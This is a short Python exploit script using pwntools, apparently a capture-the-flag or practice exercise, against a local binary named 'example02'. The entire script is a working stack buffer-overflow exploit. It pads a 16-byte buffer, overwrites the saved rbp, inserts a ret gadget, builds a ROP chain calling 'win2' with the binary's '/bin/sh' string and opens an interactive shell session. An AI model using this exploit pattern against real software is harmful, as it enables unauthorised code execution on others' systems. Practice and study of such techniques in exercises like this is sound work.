from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

binary = ELF('./example02')
rop = ROP('./example02')

p = process('./example02')

# gdb.attach(p, "")

payload = b''
payload += b'A' * 16 # buffer
payload += p64(0x0) # rbp
payload += p64(0x0000000000400506) # ret
#payload += p64(0x0000000000400743) # pop rdi
#payload += p64(0x400795) # rdi "/bin/sh"
# payload += p64(0x40065f) # win2
#payload += p64(binary.symbols['win1']) # win1
rop.call('win2', [next(binary.search(b'/bin/sh\x00'))])
print(rop.dump())

payload += rop.chain()

p.sendline(payload)

p.interactive()
